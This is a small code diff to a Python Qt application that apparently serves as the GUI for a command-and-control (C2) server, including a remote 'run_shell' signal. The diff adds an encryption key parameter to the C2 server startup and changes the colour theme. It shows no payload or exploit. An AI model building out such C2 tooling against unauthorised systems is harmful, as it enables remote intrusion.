@@ -120,7 +120,7 @@ class Main(QObject):
         self.gui_server.run_shell.connect(self.c2server.run_shell)
 
         self.logger.info("Starting C2 server")
-        self.c2server.start(config.get("c2_ip"), config.get("c2_port"))
+        self.c2server.start(config.get("c2_ip"), config.get("c2_port"), config.get("c2_key"))
         self.c2server.setJSONDecoder(MessageDecoder)
         self.c2server.setJSONEncoder(MessageEncoder)
 
@@ -184,7 +184,7 @@ if __name__ == '__main__':
     app.setApplicationVersion(__version__)
     app.setApplicationDisplayName(__app_name__)
 
-    app.setStyleSheet(qrainbowstyle.load_stylesheet("darkorange"))
+    app.setStyleSheet(qrainbowstyle.load_stylesheet(style="Oceanic"))
     font = QApplication.font()
     font.setPointSize(9)
     app.setFont(font)
